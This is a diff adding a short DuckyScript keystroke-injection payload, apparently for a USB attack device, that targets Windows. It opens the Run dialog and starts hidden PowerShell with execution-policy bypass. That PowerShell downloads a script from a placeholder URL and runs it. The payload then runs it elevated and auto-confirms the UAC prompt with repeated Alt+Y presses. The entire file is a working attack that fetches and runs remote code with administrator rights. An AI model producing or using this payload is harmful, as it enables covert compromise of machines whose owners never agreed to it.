@@ -1,0 +1,15 @@
+LOCALE US
+DELAY 1500
+GUI r
+DELAY 500
+STRING conhost powershell -w h -ep bypass wget >>URL<< -o ~/anti.ps1; ~/anti.ps1;
+CTRL SHIFT ENTER
+DELAY 2000
+VAR $I = 3
+WHILE ($I > 0)
+    ALT y
+    DELAY 1000
+    $I = ($I - 1)
+END_WHILE
+LEFT
+ENTER
